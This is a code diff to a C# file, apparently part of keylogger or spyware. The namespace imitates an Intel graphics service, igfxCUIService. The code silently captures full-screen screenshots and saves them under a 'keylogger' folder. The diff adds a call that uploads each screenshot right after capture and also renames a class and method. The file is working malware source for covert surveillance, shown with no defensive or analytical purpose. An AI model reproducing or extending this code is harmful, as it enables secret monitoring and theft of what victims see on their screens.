@@ -12,7 +12,7 @@ using System.Drawing.Imaging;
 
 namespace igfxCUIService
 {
-    class screenshots
+    class Screenshots
     {
         #region[screenshots]
 
@@ -21,6 +21,7 @@ namespace igfxCUIService
         private static decimal hour;
         private static decimal minuten;
         private static decimal seconde;
+        public static System.Drawing.Bitmap image;
         #endregion
 
         #region [ aantal screenshots]
@@ -34,14 +35,14 @@ namespace igfxCUIService
                 hour = TimeNow.Hour;
                 minuten = TimeNow.Minute;
                 seconde = TimeNow.Second;
-                printscreen();
+                Printscreen();
             }
         }
 
         #endregion
 
         #region [printscreens]
-        private static void printscreen()
+        private static void Printscreen()
         {
             Thread.Sleep(2500);
             Rectangle bounds = Screen.GetBounds(Point.Empty);
@@ -52,12 +53,15 @@ namespace igfxCUIService
                     g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                 }
 
+                image = bitmap;
+                Upload.Uploadfile();
+
+                
                 string folderName = @"D:/keylogger/screenshot/";
                 string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
                 System.IO.Directory.CreateDirectory(pathString);
                 bitmap.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);
-
-
+                
             }
         }
 
